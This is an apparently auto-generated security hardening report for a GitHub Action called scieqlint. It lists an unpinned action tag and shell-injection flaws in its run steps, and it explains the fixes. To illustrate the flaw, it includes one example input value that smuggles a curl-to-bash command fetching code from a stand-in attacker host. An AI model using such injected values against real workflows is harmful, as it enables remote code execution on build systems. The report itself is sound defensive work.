<!-- markdownlint-disable -->

# Hardening Report: 1sgtpepper--scieqlint/v1.1.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **1sgtpepper--scieqlint/v1.1.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The action uses `actions/setup-python@v6`, which is pinned to a mutable version tag rather than a full 40-character commit SHA. A tag can be moved to point to a different (potentially malicious) commit, enabling supply-chain attacks. It should be pinned to a specific SHA, e.g. `actions/setup-python@<40-char-sha> # v6`.

Locations:

- `action.yml:22`

### script-injection (severity: high)

Sub-rule (a): Two `run:` steps directly interpolate GitHub Actions expressions into shell command strings without routing through env vars, allowing an attacker to inject arbitrary shell commands via the action inputs.

1. `run: python -m pip install "scieqlint==${{ inputs.package-version }}"` — `${{ inputs.package-version }}` is expanded by the template engine before the shell sees it. A value like `1.0.0" && curl https://evil.com/x | bash #` would execute arbitrary code.

2. `run: scieqlint ${{ inputs.args }}` — `${{ inputs.args }}` is expanded directly into the shell command. Any shell metacharacters in the input (`;`, `|`, `&&`, `$(...)`, etc.) will be interpreted by the shell. The fix is to pass these values via `env:` variables and reference them as quoted shell variables: `"$PACKAGE_VERSION"` and `"$ARGS"`.

Locations:

- `action.yml:26`
- `action.yml:29`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.package-version }}" appears directly in run: block of step "Install SciEqLint"; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run SciEqLint"; move to env: map

Locations:

- `action.yml:31`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed three categories of findings in hardened/action/action.yml:
1. Pinned `actions/setup-python@v6` to full commit SHA `ece7cb06caefa5fff74198d8649806c4678c61a1` (keeping `# v6` comment for readability).
2. Moved `${{ inputs.package-version }}` into an `env:` block as `PACKAGE_VERSION` and referenced it as `"$PACKAGE_VERSION"` in the pip install command.
3. Moved `${{ inputs.args }}` into an `env:` block as `INPUT_ARGS` and used xargs-based tokenization into a bash array (`args=()`) to properly split the argument list while preserving quoted sub-arguments and preventing shell injection.

